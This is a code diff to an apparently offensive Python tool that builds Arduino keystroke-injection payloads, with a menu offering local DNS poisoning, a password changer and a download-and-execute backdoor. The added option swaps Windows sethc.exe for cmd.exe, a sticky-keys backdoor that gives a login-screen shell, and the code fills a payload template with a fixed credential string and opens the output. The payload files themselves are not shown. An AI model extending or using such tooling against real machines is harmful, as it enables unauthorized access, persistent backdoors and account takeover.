@@ -5,6 +5,7 @@ def subcommandmenu():
         1 - Payload local dns poisoning
         2 - Password allusrpass changer
         3 - Download and Execute backdoor
+        4 - Change sethc.exe by cmd.exe 
         0 - Back to frist select menu
         """)
 
@@ -58,7 +59,17 @@ def subcommandmenu():
         os.system("start out/OUT-Downandexecute.ino")
 
 
-
+    elif submenuselect == "4":
+        data = "RamalhoSec"
+        f = open('payloads/Comandlocaluseredit.ino', 'r')
+        filedata = f.read()
+        f.close()
+        newdata = filedata.replace("CREDS", data)
+        f = open('out/OUT-Comandlocaluseredit.ino', 'w')
+        f.write(newdata)
+        f.close()
+        os.system("start out/OUT-Comandlocaluseredit.ino")
+        
 
     elif submenuselect == "0":
         os.system('cls')
